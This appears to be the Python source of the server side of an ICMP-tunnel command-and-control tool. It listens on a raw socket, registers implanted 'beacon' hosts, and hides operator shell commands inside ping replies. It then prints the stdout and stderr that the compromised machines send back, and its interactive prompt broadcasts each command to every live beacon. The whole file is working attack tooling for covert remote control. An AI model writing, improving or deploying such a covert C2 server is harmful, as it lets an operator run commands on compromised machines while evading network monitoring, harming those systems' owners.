#!/home/joe/.venv/bin/python3
import json
from queue import Queue
from scapy.packet import Packet
from scapy.layers.inet import IP, ICMP
from socket import *
from threading import Thread, RLock
from time import time

BUFFER = bytearray(2**16)
TIMEOUT = 1.0
LIFETIME = 10.0


class Beacon:
    last_seen: int

    def __init__(self):
        self.last_seen = time()
        self.q = Queue()

    def get_cmd(self) -> bytes:
        if not self.q.empty():
            return self.q.get()
        else:
            return b"rem"


class Beacons:
    _beacons: dict[str, Beacon]
    _lock: RLock

    def __init__(self):
        self._beacons = {}
        self._lock = RLock()

    def __getitem__(self, ip: str) -> Beacon:
        with self._lock:
            return self._beacons[ip]

    def __enter__(self):
        return self._lock.__enter__()

    def __exit__(self, exc_type, exc_val, exc_tb):
        return self._lock.__exit__(exc_type, exc_val, exc_tb)

    def lock(self) -> None:
        self._lock.acquire()

    def unlock(self) -> None:
        self._lock.release()

    def see(self, ip: str) -> None:
        with self._lock:
            if ip not in self._beacons:
                self._beacons[ip] = Beacon()
                print(f"\nnew beacon added {ip}", flush=True)
            else:
                self._beacons[ip].last_seen = time()

    def prune(self) -> None:
        with self._lock:
            t = time()

            beacons = list(self._beacons.items())
            for ip, beacon in beacons:
                if t - beacon.last_seen > LIFETIME:
                    del self._beacons[ip]
                    print(f"\nbeacon timed out {ip}", flush=True)
                    if len(self._beacons) == 0:
                        print("\nno beacons left", flush=True)

    def post_cmd(self, cmd: str) -> None:
        with self._lock:
            self.prune()

            if len(self._beacons) == 0:
                print("\nno beacons to send command to", flush=True)

            t = time()
            for ip, beacon in self._beacons.items():
                beacon.q.put(cmd.encode("utf-8"))
                beacon.last_seen = t


oq = Queue()  # queue for recieved output
killq = Queue()  # queue for killing threads

beacons = Beacons()  # shared object for managing beacons


# handles replying to the beacon
def reply(request: Packet) -> bytes:
    body = request[ICMP].load
    ip = request[IP].src
    beacons.see(ip)

    try:
        obj = json.loads(body)
        obj["ip"] = request[IP].src
        oq.put(obj)
        return "valid json output recieved".encode("utf-8")

    except json.JSONDecodeError:
        if body == "gib command".encode("utf-8"):
            with beacons:
                return beacons[ip].get_cmd()

    except Exception as e:
        oq.put(f"error in reply: {e}")
        return "error".encode("utf-8")


# handles packets and communication
def worker(s: SocketType) -> None:
    # take responsibility for the ip header
    s.setsockopt(SOL_IP, IP_HDRINCL, 1)

    # main loop
    while True:
        try:
            if not killq.empty():
                return

            # receive packet
            try:
                s.settimeout(1)
                recv = s.recvfrom_into(BUFFER, len(BUFFER))
            except TimeoutError:
                continue

            size = recv[0]
            address = recv[1]

            # parse packet
            p: Packet = IP(BUFFER[:size])

            if not p.haslayer(ICMP):
                raise Exception("Not an ICMP packet")

            # if packet is icmp echo request
            if p[ICMP].type != 8:
                continue

            # change body
            p[ICMP].load = reply(p)

            # swap src and dst
            p.dst, p.src = p.src, p.dst

            # change icmp type to echo reply
            p[ICMP].type = 0

            # remove checksum (scapy will recalculate)
            p[ICMP].chksum = None

            # send packet
            try:
                s.settimeout(TIMEOUT)
                s.sendto(bytes(p), address)
            except OSError as e:
                if e.errno == 90:
                    pass  # this means packet size is bigger than mtu
                raise e

        except KeyboardInterrupt:
            return
        except Exception as e:
            oq.put(f"error in worker: {e}")


def printer() -> None:
    while True:
        try:
            if not killq.empty():
                return

            if not oq.empty():
                # get output from queue
                output: dict = oq.get()
                ip = output.pop("ip", None)

                for k in ["stdout", "stderr"]:
                    if output[k] != "":
                        print(f"{ip} {k}:")
                        for line in output[k].splitlines():
                            print(f"\t{line}")

                print("$ ", end="", flush=True)

            else:
                beacons.prune()

        except KeyboardInterrupt:
            return

        except Exception as e:
            oq.put(f"error in printer: {e}")


def shell() -> None:
    while True:
        try:
            command = input("$ ").strip()

            if not command:
                continue

            beacons.post_cmd(command)

        except KeyboardInterrupt:
            print("\nKilling threads gracefully...")
            killq.put("kill")
            return

        except Exception as e:
            oq.put(f"error in shell: {e}")
            continue


if __name__ == "__main__":
    s: SocketType = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)

    try:
        thread_args = [
            (worker, (s,)),
            (printer, ()),
        ]

        for t, a in thread_args:
            p = Thread(target=t, args=a)
            p.start()

        shell()

    except KeyboardInterrupt:
        pass

    finally:
        s.close()
